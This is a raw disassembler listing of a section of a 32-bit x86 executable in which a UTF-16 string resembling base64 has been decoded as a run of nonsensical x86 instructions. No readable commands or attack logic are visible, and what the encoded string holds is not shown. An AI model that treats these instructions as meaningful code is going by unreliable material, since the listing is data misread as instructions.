  40ae48:	4b                   	dec    %ebx
  40ae49:	00 4c 00 57          	add    %cl,0x57(%eax,%eax,1)
  40ae4d:	00 59 00             	add    %bl,0x0(%ecx)
  40ae50:	65 00 35 00 51 00 75 	add    %dh,%gs:0x75005100
  40ae57:	00 41 00             	add    %al,0x0(%ecx)
  40ae5a:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
  40ae5e:	2b 00                	sub    (%eax),%eax
  40ae60:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40ae64:	51                   	push   %ecx
  40ae65:	00 78 00             	add    %bh,0x0(%eax)
  40ae68:	76 00                	jbe    0x40ae6a
  40ae6a:	46                   	inc    %esi
  40ae6b:	00 55 00             	add    %dl,0x0(%ebp)
  40ae6e:	4b                   	dec    %ebx
  40ae6f:	00 4a 00             	add    %cl,0x0(%edx)
  40ae72:	68 00 78 00 6d       	push   $0x6d007800
  40ae77:	00 77 00             	add    %dh,0x0(%edi)
  40ae7a:	4f                   	dec    %edi
  40ae7b:	00 42 00             	add    %al,0x0(%edx)
  40ae7e:	73 00                	jae    0x40ae80
  40ae80:	42                   	inc    %edx
  40ae81:	00 37                	add    %dh,(%edi)
  40ae83:	00 79 00             	add    %bh,0x0(%ecx)
  40ae86:	36 00 6c 00 31       	add    %ch,%ss:0x31(%eax,%eax,1)
  40ae8b:	00 44 00 7a          	add    %al,0x7a(%eax,%eax,1)
  40ae8f:	00 79 00             	add    %bh,0x0(%ecx)
  40ae92:	6c                   	insb   (%dx),%es:(%edi)
  40ae93:	00 49 00             	add    %cl,0x0(%ecx)
  40ae96:	69 00 36 00 61 00    	imul   $0x610036,(%eax),%eax
  40ae9c:	79 00                	jns    0x40ae9e
  40ae9e:	33 00                	xor    (%eax),%eax
  40aea0:	74 00                	je     0x40aea2
  40aea2:	55                   	push   %ebp
  40aea3:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
  40aea7:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  40aeab:	00 47 00             	add    %al,0x0(%edi)
  40aeae:	50                   	push   %eax
  40aeaf:	00 50 00             	add    %dl,0x0(%eax)
  40aeb2:	68 00 32 00 48       	push   $0x48003200
  40aeb7:	00 71 00             	add    %dh,0x0(%ecx)
  40aeba:	6e                   	outsb  %ds:(%esi),(%dx)
  40aebb:	00 72 00             	add    %dh,0x0(%edx)
  40aebe:	43                   	inc    %ebx
  40aebf:	00 41 00             	add    %al,0x0(%ecx)
  40aec2:	6a 00                	push   $0x0
  40aec4:	44                   	inc    %esp
  40aec5:	00 75 00             	add    %dh,0x0(%ebp)
  40aec8:	63 00                	arpl   %eax,(%eax)
  40aeca:	78 00                	js     0x40aecc
  40aecc:	73 00                	jae    0x40aece
  40aece:	6f                   	outsl  %ds:(%esi),(%dx)
  40aecf:	00 51 00             	add    %dl,0x0(%ecx)
  40aed2:	68 00 61 00 68       	push   $0x68006100
  40aed7:	00 37                	add    %dh,(%edi)
  40aed9:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
  40aedd:	00 62 00             	add    %ah,0x0(%edx)
  40aee0:	6d                   	insl   (%dx),%es:(%edi)
  40aee1:	00 52 00             	add    %dl,0x0(%edx)
  40aee4:	71 00                	jno    0x40aee6
  40aee6:	6a 00                	push   $0x0
  40aee8:	76 00                	jbe    0x40aeea
  40aeea:	4f                   	dec    %edi
  40aeeb:	00 62 00             	add    %ah,0x0(%edx)
  40aeee:	72 00                	jb     0x40aef0
  40aef0:	53                   	push   %ebx
  40aef1:	00 52 00             	add    %dl,0x0(%edx)
  40aef4:	58                   	pop    %eax
  40aef5:	00 51 00             	add    %dl,0x0(%ecx)
  40aef8:	42                   	inc    %edx
  40aef9:	00 74 00 31          	add    %dh,0x31(%eax,%eax,1)
  40aefd:	00 41 00             	add    %al,0x0(%ecx)
  40af00:	6f                   	outsl  %ds:(%esi),(%dx)
  40af01:	00 6b 00             	add    %ch,0x0(%ebx)
  40af04:	4c                   	dec    %esp
  40af05:	00 38                	add    %bh,(%eax)
  40af07:	00 6f 00             	add    %ch,0x0(%edi)
  40af0a:	39 00                	cmp    %eax,(%eax)
  40af0c:	53                   	push   %ebx
  40af0d:	00 42 00             	add    %al,0x0(%edx)
  40af10:	6e                   	outsb  %ds:(%esi),(%dx)
  40af11:	00 50 00             	add    %dl,0x0(%eax)
  40af14:	67 00 44 00          	add    %al,0x0(%si)
  40af18:	63 00                	arpl   %eax,(%eax)
  40af1a:	41                   	inc    %ecx
  40af1b:	00 6a 00             	add    %ch,0x0(%edx)
  40af1e:	35 00 61 00 63       	xor    $0x63006100,%eax
  40af23:	00 6e 00             	add    %ch,0x0(%esi)
  40af26:	56                   	push   %esi
  40af27:	00 32                	add    %dh,(%edx)
  40af29:	00 44 00 36          	add    %al,0x36(%eax,%eax,1)
  40af2d:	00 5a 00             	add    %bl,0x0(%edx)
  40af30:	44                   	inc    %esp
  40af31:	00 30                	add    %dh,(%eax)
  40af33:	00 42 00             	add    %al,0x0(%edx)
  40af36:	72 00                	jb     0x40af38
  40af38:	48                   	dec    %eax
  40af39:	00 6e 00             	add    %ch,0x0(%esi)
  40af3c:	55                   	push   %ebp
  40af3d:	00 77 00             	add    %dh,0x0(%edi)
  40af40:	70 00                	jo     0x40af42
  40af42:	4f                   	dec    %edi
  40af43:	00 41 00             	add    %al,0x0(%ecx)
  40af46:	63 00                	arpl   %eax,(%eax)
  40af48:	71 00                	jno    0x40af4a
  40af4a:	5a                   	pop    %edx
  40af4b:	00 47 00             	add    %al,0x0(%edi)
  40af4e:	4f                   	dec    %edi
  40af4f:	00 43 00             	add    %al,0x0(%ebx)
  40af52:	41                   	inc    %ecx
  40af53:	00 53 00             	add    %dl,0x0(%ebx)
  40af56:	55                   	push   %ebp
  40af57:	00 33                	add    %dh,(%ebx)
  40af59:	00 35 00 6f 00 43    	add    %dh,0x43006f00
  40af5f:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
  40af63:	00 58 00             	add    %bl,0x0(%eax)
  40af66:	54                   	push   %esp
  40af67:	00 59 00             	add    %bl,0x0(%ecx)
  40af6a:	74 00                	je     0x40af6c
  40af6c:	37                   	aaa
  40af6d:	00 4d 00             	add    %cl,0x0(%ebp)
  40af70:	66 00 6c 00 44       	data16 add %ch,0x44(%eax,%eax,1)
  40af75:	00 73 00             	add    %dh,0x0(%ebx)
  40af78:	51                   	push   %ecx
  40af79:	00 6d 00             	add    %ch,0x0(%ebp)
  40af7c:	54                   	push   %esp
  40af7d:	00 4d 00             	add    %cl,0x0(%ebp)
  40af80:	2b 00                	sub    (%eax),%eax
  40af82:	5a                   	pop    %edx
  40af83:	00 42 00             	add    %al,0x0(%edx)
  40af86:	59                   	pop    %ecx
  40af87:	00 36                	add    %dh,(%esi)
  40af89:	00 73 00             	add    %dh,0x0(%ebx)
  40af8c:	52                   	push   %edx
  40af8d:	00 78 00             	add    %bh,0x0(%eax)
  40af90:	6c                   	insb   (%dx),%es:(%edi)
  40af91:	00 6a 00             	add    %ch,0x0(%edx)
  40af94:	65 00 47 00          	add    %al,%gs:0x0(%edi)
  40af98:	68 00 49 00 38       	push   $0x38004900
  40af9d:	00 52 00             	add    %dl,0x0(%edx)
  40afa0:	46                   	inc    %esi
  40afa1:	00 46 00             	add    %al,0x0(%esi)
  40afa4:	66 00 41 00          	data16 add %al,0x0(%ecx)
  40afa8:	4f                   	dec    %edi
  40afa9:	00 66 00             	add    %ah,0x0(%esi)
  40afac:	49                   	dec    %ecx
  40afad:	00 44 00 64          	add    %al,0x64(%eax,%eax,1)
  40afb1:	00 36                	add    %dh,(%esi)
  40afb3:	00 59 00             	add    %bl,0x0(%ecx)
  40afb6:	59                   	pop    %ecx
  40afb7:	00 66 00             	add    %ah,0x0(%esi)
  40afba:	42                   	inc    %edx
  40afbb:	00 52 00             	add    %dl,0x0(%edx)
  40afbe:	78 00                	js     0x40afc0
  40afc0:	4d                   	dec    %ebp
  40afc1:	00 32                	add    %dh,(%edx)
  40afc3:	00 32                	add    %dh,(%edx)
  40afc5:	00 6c 00 50          	add    %ch,0x50(%eax,%eax,1)
  40afc9:	00 5a 00             	add    %bl,0x0(%edx)
  40afcc:	47                   	inc    %edi
  40afcd:	00 33                	add    %dh,(%ebx)
  40afcf:	00 57 00             	add    %dl,0x0(%edi)
  40afd2:	51                   	push   %ecx
  40afd3:	00 4d 00             	add    %cl,0x0(%ebp)
  40afd6:	64 00 38             	add    %bh,%fs:(%eax)
  40afd9:	00 5a 00             	add    %bl,0x0(%edx)
  40afdc:	67 00 53 00          	add    %dl,0x0(%bp,%di)
  40afe0:	5a                   	pop    %edx
  40afe1:	00 79 00             	add    %bh,0x0(%ecx)
  40afe4:	66 00 41 00          	data16 add %al,0x0(%ecx)
  40afe8:	59                   	pop    %ecx
  40afe9:	00 4e 00             	add    %cl,0x0(%esi)
  40afec:	71 00                	jno    0x40afee
  40afee:	53                   	push   %ebx
  40afef:	00 4c 00 32          	add    %cl,0x32(%eax,%eax,1)
  40aff3:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  40aff7:	00 57 00             	add    %dl,0x0(%edi)
  40affa:	35 00 6f 00 34       	xor    $0x34006f00,%eax
  40afff:	00 46 00             	add    %al,0x0(%esi)
  40b002:	43                   	inc    %ebx
  40b003:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40b007:	00 30                	add    %dh,(%eax)
  40b009:	00 37                	add    %dh,(%edi)
  40b00b:	00 72 00             	add    %dh,0x0(%edx)
  40b00e:	44                   	inc    %esp
  40b00f:	00 4d 00             	add    %cl,0x0(%ebp)
  40b012:	74 00                	je     0x40b014
  40b014:	36 00 50 00          	add    %dl,%ss:0x0(%eax)
  40b018:	48                   	dec    %eax
  40b019:	00 36                	add    %dh,(%esi)
  40b01b:	00 4f 00             	add    %cl,0x0(%edi)
  40b01e:	56                   	push   %esi
  40b01f:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40b023:	00 41 00             	add    %al,0x0(%ecx)
  40b026:	56                   	push   %esi
  40b027:	00 2f                	add    %ch,(%edi)
  40b029:	00 39                	add    %bh,(%ecx)
  40b02b:	00 46 00             	add    %al,0x0(%esi)
  40b02e:	37                   	aaa
  40b02f:	00 73 00             	add    %dh,0x0(%ebx)
  40b032:	74 00                	je     0x40b034
  40b034:	68 00 6c 00 58       	push   $0x58006c00
  40b039:	00 72 00             	add    %dh,0x0(%edx)
  40b03c:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  40b040:	39 00                	cmp    %eax,(%eax)
  40b042:	76 00                	jbe    0x40b044
  40b044:	34 00                	xor    $0x0,%al
  40b046:	42                   	inc    %edx
  40b047:	00 64 00 31          	add    %ah,0x31(%eax,%eax,1)
  40b04b:	00 7a 00             	add    %bh,0x0(%edx)
  40b04e:	49                   	dec    %ecx
  40b04f:	00 53 00             	add    %dl,0x0(%ebx)
  40b052:	35 00 58 00 63       	xor    $0x63005800,%eax
  40b057:	00 6b 00             	add    %ch,0x0(%ebx)
  40b05a:	46                   	inc    %esi
  40b05b:	00 5a 00             	add    %bl,0x0(%edx)
  40b05e:	46                   	inc    %esi
  40b05f:	00 36                	add    %dh,(%esi)
  40b061:	00 71 00             	add    %dh,0x0(%ecx)
  40b064:	37                   	aaa
  40b065:	00 43 00             	add    %al,0x0(%ebx)
  40b068:	71 00                	jno    0x40b06a
  40b06a:	45                   	inc    %ebp
  40b06b:	00 50 00             	add    %dl,0x0(%eax)
  40b06e:	72 00                	jb     0x40b070
  40b070:	49                   	dec    %ecx
  40b071:	00 30                	add    %dh,(%eax)
  40b073:	00 6e 00             	add    %ch,0x0(%esi)
  40b076:	52                   	push   %edx
  40b077:	00 72 00             	add    %dh,0x0(%edx)
  40b07a:	54                   	push   %esp
  40b07b:	00 42 00             	add    %al,0x0(%edx)
  40b07e:	69 00 4d 00 36 00    	imul   $0x36004d,(%eax),%eax
  40b084:	4b                   	dec    %ebx
  40b085:	00 39                	add    %bh,(%ecx)
  40b087:	00 50 00             	add    %dl,0x0(%eax)
  40b08a:	44                   	inc    %esp
  40b08b:	00 6f 00             	add    %ch,0x0(%edi)
  40b08e:	6f                   	outsl  %ds:(%esi),(%dx)
  40b08f:	00 2f                	add    %ch,(%edi)
  40b091:	00 76 00             	add    %dh,0x0(%esi)
  40b094:	2f                   	das
  40b095:	00 78 00             	add    %bh,0x0(%eax)
  40b098:	75 00                	jne    0x40b09a
  40b09a:	58                   	pop    %eax
  40b09b:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  40b09f:	00 47 00             	add    %al,0x0(%edi)
  40b0a2:	69 00 4c 00 76 00    	imul   $0x76004c,(%eax),%eax
  40b0a8:	72 00                	jb     0x40b0aa
  40b0aa:	68 00 44 00 36       	push   $0x36004400
  40b0af:	00 44 00 56          	add    %al,0x56(%eax,%eax,1)
  40b0b3:	00 4a 00             	add    %cl,0x0(%edx)
  40b0b6:	51                   	push   %ecx
  40b0b7:	00 51 00             	add    %dl,0x0(%ecx)
  40b0ba:	72 00                	jb     0x40b0bc
  40b0bc:	55                   	push   %ebp
  40b0bd:	00 75 00             	add    %dh,0x0(%ebp)
  40b0c0:	4d                   	dec    %ebp
  40b0c1:	00 2b                	add    %ch,(%ebx)
  40b0c3:	00 33                	add    %dh,(%ebx)
  40b0c5:	00 36                	add    %dh,(%esi)
  40b0c7:	00 33                	add    %dh,(%ebx)
  40b0c9:	00 31                	add    %dh,(%ecx)
  40b0cb:	00 65 00             	add    %ah,0x0(%ebp)
  40b0ce:	43                   	inc    %ebx
  40b0cf:	00 53 00             	add    %dl,0x0(%ebx)
  40b0d2:	4c                   	dec    %esp
  40b0d3:	00 42 00             	add    %al,0x0(%edx)
  40b0d6:	37                   	aaa
  40b0d7:	00 66 00             	add    %ah,0x0(%esi)
  40b0da:	53                   	push   %ebx
  40b0db:	00 75 00             	add    %dh,0x0(%ebp)
  40b0de:	50                   	push   %eax
  40b0df:	00 57 00             	add    %dl,0x0(%edi)
  40b0e2:	71 00                	jno    0x40b0e4
  40b0e4:	56                   	push   %esi
  40b0e5:	00 32                	add    %dh,(%edx)
  40b0e7:	00 6a 00             	add    %ch,0x0(%edx)
  40b0ea:	4c                   	dec    %esp
  40b0eb:	00 30                	add    %dh,(%eax)
  40b0ed:	00 68 00             	add    %ch,0x0(%eax)
  40b0f0:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40b0f4:	61                   	popa
  40b0f5:	00 76 00             	add    %dh,0x0(%esi)
  40b0f8:	4a                   	dec    %edx
  40b0f9:	00 52 00             	add    %dl,0x0(%edx)
  40b0fc:	70 00                	jo     0x40b0fe
  40b0fe:	52                   	push   %edx
  40b0ff:	00 69 00             	add    %ch,0x0(%ecx)
  40b102:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40b106:	69 00 4f 00 39 00    	imul   $0x39004f,(%eax),%eax
  40b10c:	76 00                	jbe    0x40b10e
  40b10e:	6f                   	outsl  %ds:(%esi),(%dx)
  40b10f:	00 72 00             	add    %dh,0x0(%edx)
  40b112:	41                   	inc    %ecx
  40b113:	00 4d 00             	add    %cl,0x0(%ebp)
  40b116:	55                   	push   %ebp
  40b117:	00 39                	add    %bh,(%ecx)
  40b119:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  40b11d:	00 5a 00             	add    %bl,0x0(%edx)
  40b120:	73 00                	jae    0x40b122
  40b122:	49                   	dec    %ecx
  40b123:	00 6d 00             	add    %ch,0x0(%ebp)
  40b126:	2f                   	das
  40b127:	00 66 00             	add    %ah,0x0(%esi)
  40b12a:	52                   	push   %edx
  40b12b:	00 48 00             	add    %cl,0x0(%eax)
  40b12e:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40b132:	33 00                	xor    (%eax),%eax
  40b134:	2f                   	das
  40b135:	00 42 00             	add    %al,0x0(%edx)
  40b138:	72 00                	jb     0x40b13a
  40b13a:	4d                   	dec    %ebp
  40b13b:	00 5a 00             	add    %bl,0x0(%edx)
  40b13e:	47                   	inc    %edi
  40b13f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b142:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  40b146:	70 00                	jo     0x40b148
  40b148:	42                   	inc    %edx
  40b149:	00 4f 00             	add    %cl,0x0(%edi)
  40b14c:	6c                   	insb   (%dx),%es:(%edi)
  40b14d:	00 6f 00             	add    %ch,0x0(%edi)
  40b150:	76 00                	jbe    0x40b152
  40b152:	6f                   	outsl  %ds:(%esi),(%dx)
  40b153:	00 38                	add    %bh,(%eax)
  40b155:	00 39                	add    %bh,(%ecx)
  40b157:	00 74 00 6b          	add    %dh,0x6b(%eax,%eax,1)
  40b15b:	00 73 00             	add    %dh,0x0(%ebx)
  40b15e:	48                   	dec    %eax
  40b15f:	00 2b                	add    %ch,(%ebx)
  40b161:	00 6b 00             	add    %ch,0x0(%ebx)
  40b164:	47                   	inc    %edi
  40b165:	00 58 00             	add    %bl,0x0(%eax)
  40b168:	70 00                	jo     0x40b16a
  40b16a:	39 00                	cmp    %eax,(%eax)
  40b16c:	61                   	popa
  40b16d:	00 2f                	add    %ch,(%edi)
  40b16f:	00 56 00             	add    %dl,0x0(%esi)
  40b172:	6a 00                	push   $0x0
  40b174:	6c                   	insb   (%dx),%es:(%edi)
  40b175:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40b179:	00 45 00             	add    %al,0x0(%ebp)
  40b17c:	6a 00                	push   $0x0
  40b17e:	7a 00                	jp     0x40b180
  40b180:	4d                   	dec    %ebp
  40b181:	00 71 00             	add    %dh,0x0(%ecx)
  40b184:	4a                   	dec    %edx
  40b185:	00 4e 00             	add    %cl,0x0(%esi)
  40b188:	4c                   	dec    %esp
  40b189:	00 61 00             	add    %ah,0x0(%ecx)
  40b18c:	32 00                	xor    (%eax),%al
  40b18e:	6b 00 66             	imul   $0x66,(%eax),%eax
  40b191:	00 77 00             	add    %dh,0x0(%edi)
  40b194:	75 00                	jne    0x40b196
  40b196:	7a 00                	jp     0x40b198
  40b198:	38 00                	cmp    %al,(%eax)
  40b19a:	39 00                	cmp    %eax,(%eax)
  40b19c:	42                   	inc    %edx
  40b19d:	00 55 00             	add    %dl,0x0(%ebp)
  40b1a0:	5a                   	pop    %edx
  40b1a1:	00 43 00             	add    %al,0x0(%ebx)
  40b1a4:	6f                   	outsl  %ds:(%esi),(%dx)
  40b1a5:	00 5a 00             	add    %bl,0x0(%edx)
  40b1a8:	5a                   	pop    %edx
  40b1a9:	00 35 00 39 00 57    	add    %dh,0x57003900
  40b1af:	00 43 00             	add    %al,0x0(%ebx)
  40b1b2:	52                   	push   %edx
  40b1b3:	00 42 00             	add    %al,0x0(%edx)
  40b1b6:	4c                   	dec    %esp
  40b1b7:	00 4d 00             	add    %cl,0x0(%ebp)
  40b1ba:	78 00                	js     0x40b1bc
  40b1bc:	2b 00                	sub    (%eax),%eax
  40b1be:	54                   	push   %esp
  40b1bf:	00 70 00             	add    %dh,0x0(%eax)
  40b1c2:	57                   	push   %edi
  40b1c3:	00 4c 00 79          	add    %cl,0x79(%eax,%eax,1)
  40b1c7:	00 6e 00             	add    %ch,0x0(%esi)
  40b1ca:	77 00                	ja     0x40b1cc
  40b1cc:	6c                   	insb   (%dx),%es:(%edi)
  40b1cd:	00 75 00             	add    %dh,0x0(%ebp)
  40b1d0:	48                   	dec    %eax
  40b1d1:	00 69 00             	add    %ch,0x0(%ecx)
  40b1d4:	31 00                	xor    %eax,(%eax)
  40b1d6:	39 00                	cmp    %eax,(%eax)
  40b1d8:	68 00 58 00 30       	push   $0x30005800
  40b1dd:	00 49 00             	add    %cl,0x0(%ecx)
  40b1e0:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  40b1e4:	63 00                	arpl   %eax,(%eax)
  40b1e6:	39 00                	cmp    %eax,(%eax)
  40b1e8:	6e                   	outsb  %ds:(%esi),(%dx)
  40b1e9:	00 50 00             	add    %dl,0x0(%eax)
  40b1ec:	50                   	push   %eax
  40b1ed:	00 36                	add    %dh,(%esi)
  40b1ef:	00 2b                	add    %ch,(%ebx)
  40b1f1:	00 2b                	add    %ch,(%ebx)
  40b1f3:	00 42 00             	add    %al,0x0(%edx)
  40b1f6:	35 00 68 00 6c       	xor    $0x6c006800,%eax
  40b1fb:	00 44 00 73          	add    %al,0x73(%eax,%eax,1)
  40b1ff:	00 62 00             	add    %ah,0x0(%edx)
  40b202:	4f                   	dec    %edi
  40b203:	00 6c 00 4c          	add    %ch,0x4c(%eax,%eax,1)
  40b207:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
  40b20b:	00 52 00             	add    %dl,0x0(%edx)
  40b20e:	4a                   	dec    %edx
  40b20f:	00 77 00             	add    %dh,0x0(%edi)
  40b212:	2f                   	das
  40b213:	00 45 00             	add    %al,0x0(%ebp)
  40b216:	4a                   	dec    %edx
  40b217:	00 6e 00             	add    %ch,0x0(%esi)
  40b21a:	54                   	push   %esp
  40b21b:	00 36                	add    %dh,(%esi)
  40b21d:	00 31                	add    %dh,(%ecx)
  40b21f:	00 45 00             	add    %al,0x0(%ebp)
  40b222:	42                   	inc    %edx
  40b223:	00 46 00             	add    %al,0x0(%esi)
  40b226:	74 00                	je     0x40b228
  40b228:	41                   	inc    %ecx
  40b229:	00 6b 00             	add    %ch,0x0(%ebx)
  40b22c:	72 00                	jb     0x40b22e
  40b22e:	6d                   	insl   (%dx),%es:(%edi)
  40b22f:	00 77 00             	add    %dh,0x0(%edi)
  40b232:	72 00                	jb     0x40b234
  40b234:	71 00                	jno    0x40b236
  40b236:	6a 00                	push   $0x0
  40b238:	67 00 6c 00          	add    %ch,0x0(%si)
  40b23c:	37                   	aaa
  40b23d:	00 4c 00 7a          	add    %cl,0x7a(%eax,%eax,1)
  40b241:	00 66 00             	add    %ah,0x0(%esi)
  40b244:	5a                   	pop    %edx
  40b245:	00 37                	add    %dh,(%edi)
  40b247:	00 33                	add    %dh,(%ebx)
  40b249:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b24c:	45                   	inc    %ebp
  40b24d:	00 77 00             	add    %dh,0x0(%edi)
  40b250:	63 00                	arpl   %eax,(%eax)
  40b252:	6e                   	outsb  %ds:(%esi),(%dx)
  40b253:	00 4e 00             	add    %cl,0x0(%esi)
  40b256:	72 00                	jb     0x40b258
  40b258:	71 00                	jno    0x40b25a
  40b25a:	33 00                	xor    (%eax),%eax
  40b25c:	55                   	push   %ebp
  40b25d:	00 66 00             	add    %ah,0x0(%esi)
  40b260:	2f                   	das
  40b261:	00 66 00             	add    %ah,0x0(%esi)
  40b264:	42                   	inc    %edx
  40b265:	00 47 00             	add    %al,0x0(%edi)
  40b268:	39 00                	cmp    %eax,(%eax)
  40b26a:	37                   	aaa
  40b26b:	00 49 00             	add    %cl,0x0(%ecx)
  40b26e:	68 00 45 00 49       	push   $0x49004500
  40b273:	00 41 00             	add    %al,0x0(%ecx)
  40b276:	51                   	push   %ecx
  40b277:	00 78 00             	add    %bh,0x0(%eax)
  40b27a:	58                   	pop    %eax
  40b27b:	00 4b 00             	add    %cl,0x0(%ebx)
  40b27e:	4f                   	dec    %edi
  40b27f:	00 31                	add    %dh,(%ecx)
  40b281:	00 4f 00             	add    %cl,0x0(%edi)
  40b284:	6f                   	outsl  %ds:(%esi),(%dx)
  40b285:	00 31                	add    %dh,(%ecx)
  40b287:	00 64 00 4f          	add    %ah,0x4f(%eax,%eax,1)
  40b28b:	00 78 00             	add    %bh,0x0(%eax)
  40b28e:	4e                   	dec    %esi
  40b28f:	00 72 00             	add    %dh,0x0(%edx)
  40b292:	33 00                	xor    (%eax),%eax
  40b294:	57                   	push   %edi
  40b295:	00 4f 00             	add    %cl,0x0(%edi)
  40b298:	54                   	push   %esp
  40b299:	00 38                	add    %bh,(%eax)
  40b29b:	00 71 00             	add    %dh,0x0(%ecx)
  40b29e:	49                   	dec    %ecx
  40b29f:	00 6b 00             	add    %ch,0x0(%ebx)
  40b2a2:	70 00                	jo     0x40b2a4
  40b2a4:	59                   	pop    %ecx
  40b2a5:	00 76 00             	add    %dh,0x0(%esi)
  40b2a8:	37                   	aaa
  40b2a9:	00 69 00             	add    %ch,0x0(%ecx)
  40b2ac:	68 00 30 00 64       	push   $0x64003000
  40b2b1:	00 43 00             	add    %al,0x0(%ebx)
  40b2b4:	6b 00 56             	imul   $0x56,(%eax),%eax
  40b2b7:	00 66 00             	add    %ah,0x0(%esi)
  40b2ba:	70 00                	jo     0x40b2bc
  40b2bc:	46                   	inc    %esi
  40b2bd:	00 68 00             	add    %ch,0x0(%eax)
  40b2c0:	59                   	pop    %ecx
  40b2c1:	00 43 00             	add    %al,0x0(%ebx)
  40b2c4:	5a                   	pop    %edx
  40b2c5:	00 63 00             	add    %ah,0x0(%ebx)
  40b2c8:	41                   	inc    %ecx
  40b2c9:	00 5a 00             	add    %bl,0x0(%edx)
  40b2cc:	4a                   	dec    %edx
  40b2cd:	00 6c 00 31          	add    %ch,0x31(%eax,%eax,1)
  40b2d1:	00 46 00             	add    %al,0x0(%esi)
  40b2d4:	67 00 38             	add    %bh,(%bx,%si)
  40b2d7:	00 64 00 42          	add    %ah,0x42(%eax,%eax,1)
  40b2db:	00 4c 00 73          	add    %cl,0x73(%eax,%eax,1)
  40b2df:	00 51 00             	add    %dl,0x0(%ecx)
  40b2e2:	52                   	push   %edx
  40b2e3:	00 39                	add    %bh,(%ecx)
  40b2e5:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b2e8:	57                   	push   %edi
  40b2e9:	00 46 00             	add    %al,0x0(%esi)
  40b2ec:	56                   	push   %esi
  40b2ed:	00 53 00             	add    %dl,0x0(%ebx)
  40b2f0:	75 00                	jne    0x40b2f2
  40b2f2:	57                   	push   %edi
  40b2f3:	00 49 00             	add    %cl,0x0(%ecx)
  40b2f6:	4f                   	dec    %edi
  40b2f7:	00 6d 00             	add    %ch,0x0(%ebp)
  40b2fa:	55                   	push   %ebp
  40b2fb:	00 51 00             	add    %dl,0x0(%ecx)
  40b2fe:	6c                   	insb   (%dx),%es:(%edi)
  40b2ff:	00 6e 00             	add    %ch,0x0(%esi)
  40b302:	67 00 35             	add    %dh,(%di)
  40b305:	00 51 00             	add    %dl,0x0(%ecx)
  40b308:	6c                   	insb   (%dx),%es:(%edi)
  40b309:	00 4f 00             	add    %cl,0x0(%edi)
  40b30c:	6d                   	insl   (%dx),%es:(%edi)
  40b30d:	00 30                	add    %dh,(%eax)
  40b30f:	00 69 00             	add    %ch,0x0(%ecx)
  40b312:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
  40b316:	47                   	inc    %edi
  40b317:	00 39                	add    %bh,(%ecx)
  40b319:	00 66 00             	add    %ah,0x0(%esi)
  40b31c:	44                   	inc    %esp
  40b31d:	00 62 00             	add    %ah,0x0(%edx)
  40b320:	4b                   	dec    %ebx
  40b321:	00 71 00             	add    %dh,0x0(%ecx)
  40b324:	67 00 63 00          	add    %ah,0x0(%bp,%di)
  40b328:	6a 00                	push   $0x0
  40b32a:	49                   	dec    %ecx
  40b32b:	00 68 00             	add    %ch,0x0(%eax)
  40b32e:	75 00                	jne    0x40b330
  40b330:	76 00                	jbe    0x40b332
  40b332:	62 00                	bound  %eax,(%eax)
  40b334:	4b                   	dec    %ebx
  40b335:	00 4c 00 78          	add    %cl,0x78(%eax,%eax,1)
  40b339:	00 77 00             	add    %dh,0x0(%edi)
  40b33c:	36 00 5a 00          	add    %bl,%ss:0x0(%edx)
  40b340:	50                   	push   %eax
  40b341:	00 36                	add    %dh,(%esi)
  40b343:	00 69 00             	add    %ch,0x0(%ecx)
  40b346:	34 00                	xor    $0x0,%al
  40b348:	42                   	inc    %edx
  40b349:	00 71 00             	add    %dh,0x0(%ecx)
  40b34c:	50                   	push   %eax
  40b34d:	00 37                	add    %dh,(%edi)
  40b34f:	00 70 00             	add    %dh,0x0(%eax)
  40b352:	71 00                	jno    0x40b354
  40b354:	6a 00                	push   $0x0
  40b356:	52                   	push   %edx
  40b357:	00 30                	add    %dh,(%eax)
  40b359:	00 31                	add    %dh,(%ecx)
  40b35b:	00 66 00             	add    %ah,0x0(%esi)
  40b35e:	47                   	inc    %edi
  40b35f:	00 4f 00             	add    %cl,0x0(%edi)
  40b362:	6a 00                	push   $0x0
  40b364:	2b 00                	sub    (%eax),%eax
  40b366:	76 00                	jbe    0x40b368
  40b368:	45                   	inc    %ebp
  40b369:	00 68 00             	add    %ch,0x0(%eax)
  40b36c:	47                   	inc    %edi
  40b36d:	00 44 00 4d          	add    %al,0x4d(%eax,%eax,1)
  40b371:	00 33                	add    %dh,(%ebx)
  40b373:	00 54 00 53          	add    %dl,0x53(%eax,%eax,1)
  40b377:	00 7a 00             	add    %bh,0x0(%edx)
  40b37a:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
  40b37e:	50                   	push   %eax
  40b37f:	00 6f 00             	add    %ch,0x0(%edi)
  40b382:	31 00                	xor    %eax,(%eax)
  40b384:	45                   	inc    %ebp
  40b385:	00 4d 00             	add    %cl,0x0(%ebp)
  40b388:	59                   	pop    %ecx
  40b389:	00 58 00             	add    %bl,0x0(%eax)
  40b38c:	4c                   	dec    %esp
  40b38d:	00 41 00             	add    %al,0x0(%ecx)
  40b390:	72 00                	jb     0x40b392
  40b392:	49                   	dec    %ecx
  40b393:	00 4c 00 75          	add    %cl,0x75(%eax,%eax,1)
  40b397:	00 4e 00             	add    %cl,0x0(%esi)
  40b39a:	63 00                	arpl   %eax,(%eax)
  40b39c:	46                   	inc    %esi
  40b39d:	00 6a 00             	add    %ch,0x0(%edx)
  40b3a0:	62 00                	bound  %eax,(%eax)
  40b3a2:	45                   	inc    %ebp
